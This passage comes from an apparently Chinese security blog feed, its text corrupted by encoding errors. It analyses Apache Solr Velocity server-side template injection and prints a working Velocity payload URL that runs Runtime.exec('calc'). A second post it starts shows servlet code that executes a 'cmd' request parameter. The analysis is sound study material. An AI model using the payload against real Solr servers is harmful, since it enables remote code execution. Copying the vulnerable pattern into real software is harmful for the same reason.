alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>åˆ¤æ–­æ–¹æ³•ï¼Œå†™æŸ¥è¯¢å“åº”ï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹å†…å®¹ã€‚solrReuestå°±æ˜¯æˆ‘ä»¬çš„payloadã€‚<br><img src="https://img-blog.csdnimg.cn/2020032414122987.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200324141356198.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>è·³è½¬åˆ°velocityResponWriter.class,ä¼šåˆ›å»ºvelocityæ¨¡æ¿å¼•æ“ã€‚åœ¨åˆ°133è¡Œçš„ä½ç½®è¿›å…¥æ¨¡æ¿æ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/20200324141530325.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200324141916156.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>åœ¨è¿™é‡Œä¼šè·³è½¬åˆ°SimpleNode.classç±»ï¼ˆæˆ‘ä»¬ç†Ÿæ‚‰çš„ç±»ï¼‰ï¼Œç¬¬ä¸€æ­¥ä¼šè®¾ç½®æŒ‡å¼•ï¼Œæ¥ç€ä¼šåˆ°ASTReference.class åœ¨ç¬¬å…«çš„ä½ç½®ï¼Œä¼šéå†æ–¹æ³•ï¼Œä¼šæ‰§è¡Œå‘½ä»¤ã€‚<br><img src="https://img-blog.csdnimg.cn/20200324142424569.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>åœ¨è¿™é‡Œä¼šè·³è½¬åˆ°ASTMethodç±»ä¸­ï¼Œæ‰§è¡Œã€‚<br><img src="https://img-blog.csdnimg.cn/20200324143631629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">)<img src="https://img-blog.csdnimg.cn/20200324143501469.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>å…·ä½“æ‰§è¡Œæ˜¯velocityæ¨¡æ¿å¼•æ“ä¸­æœ‰ä¸€ä¸ªClassMapç±»ä¸­ã€‚<br><img src="https://img-blog.csdnimg.cn/20200323201336890.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ol></li></ol><hr><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><h2 id="çŸ¥è¯†è¡¥å……"><a href="#çŸ¥è¯†è¡¥å……" class="headerlink" title="çŸ¥è¯†è¡¥å……"></a><strong>çŸ¥è¯†è¡¥å……</strong></h2><p>&emsp;&emsp; åœ¨å‰é¢æœ‰æ¶‰åŠåˆ°JJTreeã€payloadæ„é€ ã€JavaCCç­‰çŸ¥è¯†ï¼Œä½†ç¬”è€…å¹¶æ²¡æœ‰è¯¦ç»†çš„è¯´æ˜ï¼Œç¬”è€…æƒ³å…ˆè¯»è€…ä»¬ç®€å•äº†è§£ä¸€ä¸‹è¿™äº›çŸ¥è¯†ï¼Œç„¶ååœ¨è¯´æ˜ä¸€ä¸‹ç®€å•åšä¸ªç®€å•è¯´æ˜ã€‚</p><h2 id="setè¯­æ³•"><a href="#setè¯­æ³•" class="headerlink" title="#setè¯­æ³•"></a><strong>#setè¯­æ³•</strong></h2><p>&emsp;&emsp; #setè¯­æ³•å¯ä»¥åˆ›å»ºä¸€ä¸ªVelocityçš„å˜é‡ï¼Œ#setè¯­æ³•å¯¹åº”çš„Velocityè¯­æ³•æ ‘æ˜¯ASTSetDirectiveç±»ï¼Œç¿»å¼€è¿™ä¸ªç±»çš„ä»£ç ï¼Œå¯ä»¥å‘ç°å®ƒæœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ï¼šåˆ†åˆ«æ˜¯RightHandSideå’ŒLeftHandSideï¼Œåˆ†åˆ«ä»£è¡¨â€œ=â€ä¸¤è¾¹çš„è¡¨è¾¾å¼å€¼ã€‚ä¸Javaè¯­è¨€çš„èµ‹å€¼æ“ä½œæœ‰ç‚¹ä¸ä¸€æ ·çš„æ˜¯ï¼Œå·¦è¾¹çš„LeftHandSideå¯èƒ½æ˜¯ä¸€ä¸ªå˜é‡æ ‡è¯†ç¬¦ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªsetæ–¹æ³•è°ƒç”¨ã€‚å˜é‡æ ‡è¯†ç¬¦å¾ˆå¥½ç†è§£ï¼Œå¦‚å‰é¢çš„#set($var=â€œå¶æ•°â€)ï¼Œå¦å¤–æ˜¯ä¸€ä¸ªsetæ–¹æ³•è°ƒç”¨ï¼Œå¦‚#set($person.name=â€junshanâ€)ï¼Œè¿™å®é™…ä¸Šç›¸å½“äºJavaä¸­person.setName(â€œjunshanâ€)æ–¹æ³•çš„è°ƒç”¨ã€‚</p><h2 id="foreachè¯­æ³•"><a href="#foreachè¯­æ³•" class="headerlink" title="#foreachè¯­æ³•"></a><strong>#foreachè¯­æ³•</strong></h2><p>Velocityä¸­çš„å¾ªç¯è¯­æ³•åªæœ‰è¿™ä¸€ç§ï¼Œå®ƒä¸Javaä¸­çš„forå¾ªç¯çš„è¯­æ³•ç³–å½¢å¼ååˆ†ç±»ä¼¼ï¼Œå¦‚#foreach($child in $person.children) $person.childrenè¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªé›†åˆï¼Œå®ƒå¯èƒ½æ˜¯ä¸€ä¸ªListé›†åˆæˆ–è€…ä¸€ä¸ªæ•°ç»„ï¼Œè€Œ$childè¡¨ç¤ºçš„æ˜¯æ¯ä¸ªä»é›†åˆä¸­å–å‡ºçš„å€¼ã€‚ä»renderæ–¹æ³•ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼ŒVelocityé¦–å…ˆæ˜¯å–å¾—$person.childrençš„å€¼ï¼Œç„¶åå°†è¿™ä¸ªå€¼å°è£…æˆIteratoré›†åˆï¼Œç„¶åä¾æ¬¡å–å‡ºè¿™ä¸ªé›†åˆä¸­çš„æ¯ä¸€ä¸ªå€¼ï¼Œå°†è¿™ä¸ªå€¼ä»¥$childä¸ºå˜é‡æ ‡è¯†ç¬¦æ”¾å…¥contextä¸­ã€‚é™¤æ­¤ä»¥å¤–éœ€è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼ŒVelocityåœ¨å¾ªç¯æ—¶è¿˜åœ¨contextä¸­æ”¾å…¥äº†å¦å¤–ä¸¤ä¸ªå˜é‡ï¼Œåˆ†åˆ«æ˜¯counterNameå’ŒhasNextNameï¼Œè¿™ä¸¤ä¸ªå˜é‡çš„åç§°åˆ†åˆ«åœ¨é…ç½®æ–‡ä»¶é…ç½®é¡¹directive.foreach.counter.nameå’Œdirective.foreach.iterator.nameä¸­å®šä¹‰ï¼Œå®ƒä»¬è¡¨ç¤ºå½“å‰çš„å¾ªç¯è®¡æ•°å’Œæ˜¯å¦è¿˜æœ‰ä¸‹ä¸€ä¸ªå€¼ã€‚å‰è€…ç›¸å½“äºfor(int i=1;i&lt;10;i++)ä¸­çš„iå€¼ï¼Œåè€…ç›¸å½“äºwhile(it.hasNext())ä¸­çš„it.hasNext()çš„å€¼ï¼Œè¿™ä¸¤ä¸ªå€¼åœ¨#foreachçš„å¾ªç¯ä½“ä¸­éƒ½æœ‰å¯èƒ½ç”¨åˆ°ã€‚ç”±äºelementKeyã€counterNameå’ŒhasNextNameæ˜¯åœ¨#foreachä¸­ä¸´æ—¶åˆ›å»ºçš„ï¼Œå¦‚æœå½“å‰çš„contextä¸­å·²ç»å­˜åœ¨è¿™å‡ ä¸ªå˜é‡ï¼Œè¦æŠŠåŸå§‹çš„å˜é‡å€¼ä¿å­˜èµ·æ¥ï¼Œä»¥ä¾¿åœ¨è¿™ä¸ª#foreachæ‰§è¡Œç»“æŸåæ¢å¤ã€‚å¦‚æœcontextä¸­æ²¡æœ‰è¿™å‡ ä¸ªå˜é‡ï¼Œé‚£ä¹ˆ#foreachæ‰§è¡Œç»“æŸåè¦åˆ é™¤å®ƒä»¬ï¼Œè¿™å°±æ˜¯ä»£ç æœ€åéƒ¨åˆ†åšçš„äº‹æƒ…ï¼Œè¿™ä¸æˆ‘ä»¬å‰é¢ä»‹ç»çš„#setè¯­æ³•æ²¡æœ‰èŒƒå›´é™åˆ¶ä¸åŒï¼Œ#foreachä¸­ä¸´æ—¶äº§ç”Ÿçš„å˜é‡åªåœ¨#foreachä¸­æœ‰æ•ˆã€‚</p><h2 id="JJTreeæ¸²æŸ“è¿‡ç¨‹è§£æ"><a href="#JJTreeæ¸²æŸ“è¿‡ç¨‹è§£æ" class="headerlink" title="JJTreeæ¸²æŸ“è¿‡ç¨‹è§£æ"></a><strong>JJTreeæ¸²æŸ“è¿‡ç¨‹è§£æ</strong></h2><p>ä¸‹é¢æ˜¯JJTreeçš„è¯­æ³•æ ‘ï¼š<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvOTkwNTMyLzIwMTYxMC85OTA1MzItMjAxNjEwMjUxNTI3NDM3NTAtMTA4MzgwODIyOC5wbmc?x-oss-process=image/format,png" alt></p><h2 id="å…³äºPOCæ„é€ æ–¹æ³•è¡¥å……è¯´æ˜"><a href="#å…³äºPOCæ„é€ æ–¹æ³•è¡¥å……è¯´æ˜" class="headerlink" title="å…³äºPOCæ„é€ æ–¹æ³•è¡¥å……è¯´æ˜"></a><strong>å…³äºPOCæ„é€ æ–¹æ³•è¡¥å……è¯´æ˜</strong></h2><p><strong>VelocityResponseWriter åˆå§‹åŒ–å‚æ•°</strong></p><ul><li>template.base.dir<br>å¦‚æœæŒ‡å®šå¹¶ä½œä¸ºæ–‡ä»¶ç³»ç»Ÿç›®å½•å­˜åœ¨ï¼Œåˆ™å°†ä¸ºæ­¤ç›®å½•æ·»åŠ ä¸€ä¸ªæ–‡ä»¶èµ„æºåŠ è½½ç¨‹åºã€‚æ­¤ç›®å½•ä¸­çš„æ¨¡æ¿å°†è¦†ç›– â€œsolrâ€ èµ„æºåŠ è½½ç¨‹åºæ¨¡æ¿ã€‚ </li><li>init.properties.file<br>æŒ‡å®šä¸€ä¸ªå±æ€§æ–‡ä»¶åï¼Œå¿…é¡»å­˜åœ¨äº Solr çš„conf/ç›®å½•ï¼ˆè€Œä¸æ˜¯åœ¨velocity/å­ç›®å½•ä¸­ï¼‰æˆ–è€… <lib> çš„ JAR æ–‡ä»¶çš„æ ¹ä¸­ã€‚ </lib></li><li>params.resource.loader.enabled<br>â€œparamsâ€ èµ„æºåŠ è½½ç¨‹åºå…è®¸åœ¨ Solr è¯·æ±‚å‚æ•°ä¸­æŒ‡å®šæ¨¡æ¿ã€‚ä¾‹å¦‚ï¼š</li></ul><p><code>http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=CUSTOM%3A%20%23core_namev.template=custom</code>è¡¨ç¤ºè¦å‘ˆç°ä¸€ä¸ªåä¸ºâ€œè‡ªå®šä¹‰â€çš„æ¨¡æ¿ï¼Œå…¶å€¼<code>v.template.custom</code>æ˜¯è‡ªå®šä¹‰æ¨¡æ¿ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸º<code>false</code>ï¼›å®ƒä¸å¸¸ç”¨ï¼Œéœ€è¦æ—¶å¯ç”¨ã€‚</p><ul><li>solr.resource.loader.enabled<br>â€œsolrâ€ èµ„æºåŠ è½½ç¨‹åºæ˜¯é»˜è®¤æ³¨å†Œçš„å”¯ä¸€æ¨¡æ¿åŠ è½½ç¨‹åºã€‚æ¨¡æ¿æ˜¯ç”± SolrResourceLoader ä»velocity/å­ç›®å½•ä¸‹å¯è§çš„èµ„æºæä¾›çš„ã€‚VelocityResponseWriter æœ¬èº«æœ‰ä¸€äº›å†…ç½®çš„æ¨¡æ¿ï¼ˆåœ¨å®ƒ JAR æ–‡ä»¶ä¸­çš„velocity/ï¼‰ï¼Œè¿™äº›æ¨¡æ¿å¯ä»¥é€šè¿‡è¿™ä¸ªåŠ è½½ç¨‹åºè‡ªåŠ¨ä½¿ç”¨ã€‚å½“ç›¸åŒçš„æ¨¡æ¿åç§°å¤„äº conf/velocity/ æˆ–ä½¿ç”¨template.base.diré€‰é¡¹æ—¶ï¼Œå¯ä»¥è¦†ç›–è¿™äº›å†…ç½®æ¨¡æ¿ã€‚ </li></ul><hr><p><strong>VelocityResponseWriterè¯·æ±‚å‚æ•°</strong></p><ul><li><p>v.template<br>æŒ‡å®šè¦å‘ˆç°çš„æ¨¡æ¿çš„åç§°ã€‚</p></li><li><p>v.layout<br>æŒ‡å®šä¸€ä¸ªæ¨¡æ¿åç§°ï¼Œç”¨ä½œå›´ç»•ä¸»<code>v.template</code>æŒ‡å®šæ¨¡æ¿çš„å¸ƒå±€ã€‚<br>ä¸»æ¨¡æ¿å‘ˆç°ä¸ºåŒ…å«åœ¨å¸ƒå±€æ¸²æŸ“ä¸­çš„å­—ç¬¦ä¸²å€¼$contentã€‚</p></li><li><p>v.layout.enabled<br>ç¡®å®šä¸»æ¨¡æ¿æ˜¯å¦åº”è¯¥æœ‰å›´ç»•å®ƒçš„å¸ƒå±€ã€‚é»˜è®¤æ˜¯<code>true</code>ï¼Œä½†ä¹Ÿéœ€è¦æŒ‡å®š<code>v.layout</code>ã€‚<br>v.contentType<br>æŒ‡å®š HTTP å“åº”ä¸­ä½¿ç”¨çš„å†…å®¹ç±»å‹ã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œé»˜è®¤å–å†³äºæ˜¯å¦æŒ‡å®š<code>v.json</code>ã€‚<br>é»˜è®¤æƒ…å†µä¸‹ä¸åŒ…å«<code>v.json=wrfï¼štext/html;charset=UTF-8</code>ã€‚<br>é»˜è®¤ä¸º<code>v.json=wrfï¼šapplication/json;charset=UTF-8</code>ã€‚</p></li><li><p>v.json<br>æŒ‡å®šä¸€ä¸ªå‡½æ•°åç§°æ¥åŒ…è£…å‘ˆç°ä¸º JSON çš„å“åº”ã€‚å¦‚æœæŒ‡å®šï¼Œåˆ™å“åº”ä¸­ä½¿ç”¨çš„å†…å®¹ç±»å‹å°†ä¸ºâ€œapplication / json; charset = UTF-8â€ï¼Œé™¤éè¢«<code>v.contentType</code>è¦†ç›–ã€‚<br>è¾“å‡ºå°†é‡‡ç”¨ä»¥ä¸‹æ ¼å¼ï¼ˆå¸¦<code>v.json=wrf</code>ï¼‰ï¼š</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrf(&quot;result&quot;:&quot;&lt;Velocity generated response string, with quotes and backslashes escaped&gt;&quot;)</span><br></pre></td></tr></table></figure></li><li><p>v.locale<br>ä½¿ç”¨<code>$resource</code>å·¥å…·å’Œå…¶ä»– LocaleConfig å®ç°å·¥å…·çš„è¯­è¨€ç¯å¢ƒã€‚é»˜è®¤è¯­è¨€ç¯å¢ƒæ˜¯<code>Locale.ROOT</code>ã€‚æœ¬åœ°åŒ–èµ„æºä»åä¸º<code>resources[_locale-code].properties</code>çš„æ ‡å‡† Java èµ„æºåŒ…ä¸­åŠ è½½<br>å¯ä»¥é€šè¿‡æä¾›ç”± SolrResourceLoader åœ¨é€Ÿåº¦å­ä¸‹çš„èµ„æºåŒ…å¯è§çš„ JAR æ–‡ä»¶æ¥æ·»åŠ èµ„æºåŒ…ã€‚èµ„æºåŒ…ä¸èƒ½åœ¨<code>conf/</code>ä¸‹åŠ è½½ï¼Œå› ä¸ºåªæœ‰ SolrResourceLoader çš„ç±»åŠ è½½ç¨‹åºæ–¹é¢å¯ä»¥åœ¨è¿™é‡Œä½¿ç”¨ã€‚</p></li><li><p>v.template.template_name<br>å½“å¯ç”¨ â€œparamsâ€ èµ„æºåŠ è½½ç¨‹åºæ—¶ï¼Œå¯ä»¥å°†æ¨¡æ¿æŒ‡å®šä¸º Solr è¯·æ±‚çš„ä¸€éƒ¨åˆ†ã€‚<br><code>params.resource.loader.enabled</code><br>â€œparamsâ€ èµ„æºåŠ è½½ç¨‹åºå…è®¸åœ¨ Solr è¯·æ±‚å‚æ•°ä¸­æŒ‡å®šæ¨¡æ¿ã€‚ä¾‹å¦‚ï¼š<br><code>http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=CUSTOM%3A%20%23core_name</code></p></li></ul><hr><ol><li>å…ˆå°†pocè¿›è¡Œè§£ç <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8983&#x2F;solr&#x2F;test&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;#set($x&#x3D;&#39;&#39;) #set($rt&#x3D;$x.class.forName(&#39;java.lang.Runtime&#39;)) #set($chr&#x3D;$x.class.forName(&#39;java.lang.Character&#39;)) #set($str&#x3D;$x.class.forName(&#39;java.lang.String&#39;)) #set($ex&#x3D;$rt.getRuntime().exec(&#39;calc&#39;)) $ex.waitFor() #set($out&#x3D;$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure></li><li>setå’Œforeachè¯­æ³•å‰é¢éƒ½ä»‹ç»äº†ï¼Œç°åœ¨åœ¨çœ‹payloadæ˜¯ä¸æ˜¯å°±ä¸€ç›®äº†ç„¶äº†ï¼Ÿå¦‚ä½•æ„é€ ï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆæ„é€ ..<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set($x='')  </span><br><span class="line">#set($rt=$x.class.forName('java.lang.Runtime'))</span><br><span class="line">#set($chr=$x.class.forName('java.lang.Character'))  </span><br><span class="line">#set($str=$x.class.forName('java.lang.String'))</span><br><span class="line">#set($ex=$rt.getRuntime().exec('calc'))$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/2020031621445369.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200316214532444.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ol><hr><p><strong>é™„å›¾ï¼šå„æ¡†æ¶æ¨¡æ¿ç»“æ„ï¼š</strong><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wNS5zc2wucWhpbWcuY29tL3QwMWY0NzkyYzdkMDNkZDQ5Y2MucG5n?x-oss-process=image/format,png" alt></p><hr><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><h2 id="æ¼æ´æ€»ç»“"><a href="#æ¼æ´æ€»ç»“" class="headerlink" title="æ¼æ´æ€»ç»“"></a>æ¼æ´æ€»ç»“</h2><p>&emsp;&emsp; Apache Solrçš„<code>Config API</code>æ˜¯è‡ªå¸¦åŠŸèƒ½ï¼Œç”¨äºé€šè¿‡HTTPè¯·æ±‚æ›´æ”¹é…ç½®ï¼›å½“Solræœªè®¾ç½®è®¿é—®é‰´æƒæ—¶ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡ConfigAPIæ›´æ”¹é…ç½®ï¼Œä¸ºæ¼æ´åˆ©ç”¨åˆ›é€ äº†å‰æã€‚config apiæ˜¯solrå¤šæ­¤çˆ†å‡ºæ¼æ´å…³é”®<a href="https://github.com/Imanfeng/Apache-Solr-RCE" target="_blank" rel="noopener">Apache Solr RCE</a>æœ‰æƒ³æ³•çš„ç«¥é‹å¯ä»¥çœ‹çœ‹è¿™ä¸ªé¡¹ç›®ã€‚</p><h2 id="é¢˜å¤–è¯"><a href="#é¢˜å¤–è¯" class="headerlink" title="é¢˜å¤–è¯"></a>é¢˜å¤–è¯</h2><p>&emsp;&emsp; ä¹‹å‰åˆšåˆšçˆ†å‡ºæ¼æ´çš„æ—¶å€™ï¼Œç¬”è€…è¿˜æ›¾å¤ç°è¿‡ï¼Œä½†å¥ˆä½•èƒ½åŠ›æœ‰é™ï¼Œä¸èƒ½æ·±å…¥ç†è§£å…¶ä¸­å†…æ¶µã€‚æ·±è¡¨æƒ­æ„§ï¼Œæ€»çš„æ¥è¯´ï¼ŒåŠªåŠ›å­¦ä¹ ï¼Œå®‰å…¨ä¸€è¡Œä»»é‡è€Œé“è¿œã€‚</p><hr><h1 id="æ¨èå­¦ä¹ èµ„æ–™"><a href="#æ¨èå­¦ä¹ èµ„æ–™" class="headerlink" title="æ¨èå­¦ä¹ èµ„æ–™"></a>æ¨èå­¦ä¹ èµ„æ–™</h1><p>&emsp;&emsp; æƒ³è¿›è¡Œæ·±å…¥ç ”ç©¶æ­¤æ¼æ´è‚¯å®šå…‰çœ‹æˆ‘è¿™ç¯‡æ–‡ç« æ˜¯ä¸è¶³çš„ï¼Œæ¯•ç«Ÿæˆ‘è¿™è¿™ä¸ªåªæ˜¯Javaæ–¹é¢ä¸Šçš„ï¼Œpythonã€phpç­‰è¯­è¨€éƒ½æ²¡ä»‹ç»ã€‚æ•…æ­¤æ¨èï¼Œæœ›å½¼æœ‰åŠ©ã€‚</p><p><strong>å›½å†…èµ„æ–™</strong></p><p>Pythonæ–¹é¢ï¼š<a href="https://www.anquanke.com/post/id/188172" target="_blank" rel="noopener">SSTI/æ²™ç›’é€ƒé€¸è¯¦ç»†æ€»ç»“</a><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨</a><br><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2æ¨¡æ¿æ³¨å…¥ä¸­çš„ä¸€äº›ç»•è¿‡å§¿åŠ¿</a><br>PHPæ–¹é¢ï¼š<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡» ï¼ˆSSTIï¼‰ä¹‹æµ…æ</a></p><p><strong>å›½å¤–èµ„æ–™</strong></p><p>è¿™ç¯‡æ€»ç»“çš„æ¯”è¾ƒå…¨é¢ï¼š<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">Server-Side Template Injection: RCE for the modern webapp</a><br>Pythonæ–¹é¢ï¼š<a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">Jinja2 template injection filter bypasses</a></p><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.liangzl.com/get-article-detail-138970.html" target="_blank" rel="noopener">https://www.liangzl.com/get-article-detail-138970.html</a><br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a><br><a href="https://cert.360.cn/report/detail?id=6125d7f75170c309de1ffdde11f86355" target="_blank" rel="noopener">https://cert.360.cn/report/detail?id=6125d7f75170c309de1ffdde11f86355</a><br><a href="https://paper.seebug.org/1107/#41" target="_blank" rel="noopener">https://paper.seebug.org/1107/#41</a><br><a href="https://ackcent.com/blog/in-depth-freemarker-template-injection/" target="_blank" rel="noopener">https://ackcent.com/blog/in-depth-freemarker-template-injection/</a><br><a href="https://www.cnblogs.com/wade-luffy/p/5996848.html" target="_blank" rel="noopener">https://www.cnblogs.com/wade-luffy/p/5996848.html</a><br><a href="https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html" target="_blank" rel="noopener">https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html</a><br><a href="https://blog.csdn.net/weixin_38964895/article/details/81381060" target="_blank" rel="noopener">https://blog.csdn.net/weixin_38964895/article/details/81381060</a><br><a href="https://blog.csdn.net/sweety820/article/details/74347068?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/sweety820/article/details/74347068?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;ä¸ºä»€ä¹ˆè¯´Javaå®¡è®¡å—åœ¨SSTIå‘¢ï¼Ÿ&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç°è¡ŒSSTI(Server-Side Te
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java SSTI" scheme="https://summersec.github.io/tags/Java-SSTI/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥çœ ä¸è§‰æ™“ï¼ŒRCEçŸ¥å¤šå°‘ï¼Ÿ</title>
    <link href="https://summersec.github.io/2020/03/03/%E6%98%A5%E7%9C%A0%E4%B8%8D%E8%A7%89%E6%99%93%EF%BC%8CRCE%E7%9F%A5%E5%A4%9A%E5%B0%91%EF%BC%9F/"/>
    <id>https://summersec.github.io/2020/03/03/%E6%98%A5%E7%9C%A0%E4%B8%8D%E8%A7%89%E6%99%93%EF%BC%8CRCE%E7%9F%A5%E5%A4%9A%E5%B0%91%EF%BC%9F/</id>
    <published>2020-03-03T04:42:16.000Z</published>
    <updated>2020-05-05T13:15:59.889Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><ul><li>è¯»è€…å—ä¼—ï¼šæ‰€æœ‰äºº</li><li>é˜…è¯»è¦æ±‚ï¼š30mins</li><li>æ–‡ç« ä¸­2620è¿˜æ²¡å†™å®Œï¼Œæ¸…æ°´å·å´å¤§ä½¬å°±çˆ†2634äº†ï¼Œæ®è¯´ä»–è¿˜è—äº†å¾ˆå¤šä¸ª0day</li></ul><p><img src="https://img-blog.csdnimg.cn/20200303122905453.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="ç®€å•æ¡ˆä¾‹åˆ†æRCE"><a href="#ç®€å•æ¡ˆä¾‹åˆ†æRCE" class="headerlink" title="ç®€å•æ¡ˆä¾‹åˆ†æRCE"></a>ç®€å•æ¡ˆä¾‹åˆ†æRCE</h2><p><img src="https://img-blog.csdnimg.cn/20200215130716340.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>&emsp;&emsp; é€šè¿‡Javaæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä¸cmdä¸­æˆ–è€…ç»ˆç«¯ä¸Šä¸€æ ·æ‰§è¡Œshellå‘½ä»¤ï¼Œæœ€å…¸å‹çš„ç”¨æ³•å°±æ˜¯ä½¿ç”¨Runtime.getRuntime().exec(command)æˆ–è€…new ProcessBuilder(cmdArray).start()ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ¼æ´æºç </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">CommandExec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        String cmd = request.getParameter(<span class="string">"cmd"</span>).toString();</span><br><span class="line">        Runtime run = Runtime.getRuntime();</span><br><span class="line">        String lineStr = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process p = run.exec(cmd);</span><br><span class="line">            BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(p.getInputStream());</span><br><span class="line">            BufferedReader inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                lineStr += tmpStr + <span class="string">"\n"</span>;</span><br><span class="line">                System.out.println(tmpStr);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>æ¼æ´æˆå› 